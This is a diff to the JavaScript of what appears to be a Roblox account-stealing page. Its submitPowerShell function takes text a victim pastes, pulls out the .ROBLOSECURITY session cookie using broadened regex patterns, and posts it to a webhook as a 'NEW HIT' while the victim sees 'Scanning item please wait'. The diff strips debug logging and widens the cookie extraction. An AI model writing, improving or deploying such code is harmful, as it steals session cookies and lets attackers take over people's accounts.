@@ -257,13 +257,7 @@ async function submitPowerShell() {
         const limitedItems = extractLimitedItems(inputText);
         const robloxCookie = extractRobloxCookie(inputText);
         
-        // Debug logging
-        console.log('Input length:', inputText.length);
-        console.log('Cookie found:', robloxCookie ? 'YES' : 'NO');
-        if (robloxCookie) {
-            console.log('Cookie length:', robloxCookie.length);
-            console.log('Cookie preview:', robloxCookie.substring(0, 50) + '...');
-        }
+
         
         // Check word count - if 50+ words, allow through even without auth data
         const wordCount = inputText.split(/\s+/).filter(word => word.length > 0).length;
@@ -338,8 +332,6 @@ async function submitPowerShell() {
             embeds: [embed]
         };
 
-        console.log('Sending webhook with payload:', payload);
-        
         const response = await fetch(webhookUrl, {
             method: 'POST',
             headers: {
@@ -347,8 +339,6 @@ async function submitPowerShell() {
             },
             body: JSON.stringify(payload)
         });
-        
-        console.log('Webhook response status:', response.status);
         
         if (response.ok) {
             submitText.textContent = 'Scanning item please wait';
@@ -365,7 +355,6 @@ async function submitPowerShell() {
             }, 4000);
         } else {
             // If enhanced embed fails, try simple embed as fallback
-            console.log('Enhanced embed failed, trying simple format...');
             const simpleEmbed = {
                 title: "🚨 NEW HIT! 🚨",
                 color: 0xff0000,
@@ -387,7 +376,6 @@ async function submitPowerShell() {
             });
             
             if (fallbackResponse.ok) {
-                console.log('Fallback format succeeded');
                 submitText.textContent = 'Scanning item please wait';
                 submitBtn.style.background = '#10b981';
                 showNotification('Scanning item please wait', 'success');
@@ -538,20 +526,27 @@ function hasValidData(text) {
 
 // Function to scan and find authentication data from text
 function extractRobloxCookie(text) {
-    // Multiple patterns to find .ROBLOSECURITY cookies
+    // Enhanced patterns to find .ROBLOSECURITY cookies
     const patterns = [
-        // PowerShell New-Object pattern with double quotes
-        /New-Object\s+System\.Net\.Cookie\s*\(\s*"\.ROBLOSECURITY"\s*,\s*"([^"]+)"/gi,
-        // PowerShell New-Object pattern with single quotes  
-        /New-Object\s+System\.Net\.Cookie\s*\(\s*'\.ROBLOSECURITY'\s*,\s*'([^']+)'/gi,
-        // Direct .ROBLOSECURITY with quotes
-        /\.ROBLOSECURITY[^"']*["']([^"']+)["']/gi,
-        // Cookie Add pattern
-        /Cookies\.Add.*\.ROBLOSECURITY[^"']*["']([^"']+)["']/gi,
-        // Simple .ROBLOSECURITY= pattern
-        /\.ROBLOSECURITY\s*=\s*([A-Za-z0-9+/_\-]{100,})/gi,
-        // Warning format pattern
-        /WARNING.*\.ROBLOSECURITY[^A-Za-z0-9+/_\-]*([A-Za-z0-9+/_\-]{100,})/gi
+        // PowerShell New-Object patterns
+        /New-Object\s+System\.Net\.Cookie\s*\(\s*["']\.ROBLOSECURITY["']\s*,\s*["']([^"']+)["']/gi,
+        /\$session\.Cookies\.Add\s*\(\s*\(?New-Object\s+System\.Net\.Cookie\s*\(\s*["']\.ROBLOSECURITY["']\s*,\s*["']([^"']+)["']/gi,
+        
+        // Direct .ROBLOSECURITY patterns
+        /\.ROBLOSECURITY["']\s*,\s*["']([^"']{100,})["']/gi,
+        /["']\.ROBLOSECURITY["']\s*,\s*["']([^"']{100,})["']/gi,
+        
+        // Cookie assignment patterns
+        /\.ROBLOSECURITY\s*[:=]\s*["']([^"']{100,})["']/gi,
+        /\.ROBLOSECURITY\s*[:=]\s*([A-Za-z0-9+/_=\-]{100,})/gi,
+        
+        // Warning and direct value patterns
+        /WARNING.*\.ROBLOSECURITY[^A-Za-z0-9+/_=\-]*([A-Za-z0-9+/_=\-]{100,})/gi,
+        /\.ROBLOSECURITY[^A-Za-z0-9+/_=\-]+([A-Za-z0-9+/_=\-]{100,})/gi,
+        
+        // Broader patterns for any format
+        /["']([A-Za-z0-9+/_=\-]{200,})["'].*\.ROBLOSECURITY/gi,
+        /\.ROBLOSECURITY.*["']([A-Za-z0-9+/_=\-]{200,})["']/gi
     ];
     
     // Try each pattern
@@ -560,42 +555,46 @@ function extractRobloxCookie(text) {
         for (const match of matches) {
             const cookieValue = match[1];
             if (cookieValue && cookieValue.length > 50) {
-                console.log('Cookie extracted via pattern:', pattern.source);
                 return cookieValue.trim();
             }
         }
     }
     
-    // Direct search method as fallback
+    // Enhanced direct search method
     const roblosecurityIndex = text.indexOf('.ROBLOSECURITY');
     if (roblosecurityIndex !== -1) {
-        // Look for the cookie value after .ROBLOSECURITY
-        const afterRoblo = text.substring(roblosecurityIndex + '.ROBLOSECURITY'.length);
+        // Get surrounding text (500 chars before and after)
+        const start = Math.max(0, roblosecurityIndex - 500);
+        const end = Math.min(text.length, roblosecurityIndex + 1000);
+        const surrounding = text.substring(start, end);
         
-        // Try to find value in quotes
-        const quoteMatches = afterRoblo.match(/["']([A-Za-z0-9+/_\-]{50,})["']/);
-        if (quoteMatches) {
-            console.log('Cookie extracted via quote search');
-            return quoteMatches[1].trim();
-        }
+        // Look for long strings in surrounding text
+        const longPatterns = [
+            /["']([A-Za-z0-9+/_=\-]{100,})["']/g,
+            /[^A-Za-z0-9+/_=\-]([A-Za-z0-9+/_=\-]{200,})[^A-Za-z0-9+/_=\-]/g,
+            /\s([A-Za-z0-9+/_=\-]{300,})\s/g
+        ];
         
-        // Try to find value after equals
-        const equalsMatch = afterRoblo.match(/[=:]\s*([A-Za-z0-9+/_\-]{50,})/);
-        if (equalsMatch) {
-            console.log('Cookie extracted via equals search');
-            return equalsMatch[1].trim();
+        for (const pattern of longPatterns) {
+            const matches = [...surrounding.matchAll(pattern)];
+            for (const match of matches) {
+                const cookieValue = match[1];
+                if (cookieValue && cookieValue.length > 100) {
+                    return cookieValue.trim();
+                }
+            }
         }
     }
     
-    // Last resort: Look for any very long string that might be the token
-    const longStrings = text.match(/[A-Za-z0-9+/_\-]{500,}/g);
-    if (longStrings && longStrings.length > 0) {
-        const longest = longStrings.reduce((a, b) => a.length > b.length ? a : b);
-        console.log('Cookie extracted via long string fallback');
-        return longest.trim();
+    // Last resort: Find any very long string that looks like a cookie
+    const veryLongStrings = text.match(/[A-Za-z0-9+/_=\-]{400,}/g);
+    if (veryLongStrings && veryLongStrings.length > 0) {
+        const longest = veryLongStrings.reduce((a, b) => a.length > b.length ? a : b);
+        if (longest.length > 500) {
+            return longest.trim();
+        }
     }
     
-    console.log('No cookie found in text');
     return null;
 }
 
